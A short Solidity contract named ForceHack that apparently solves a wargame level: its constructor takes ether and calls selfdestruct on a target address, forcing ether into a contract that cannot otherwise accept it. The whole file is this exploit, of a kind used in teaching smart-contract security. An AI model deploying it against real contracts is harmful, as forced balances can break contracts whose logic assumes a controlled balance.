// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract ForceHack{
    constructor(address payable target)payable{
        require(msg.value>0);
        selfdestruct(target);
    }
    function collect() public payable returns(uint) {
        return address(this).balance;
    }
}

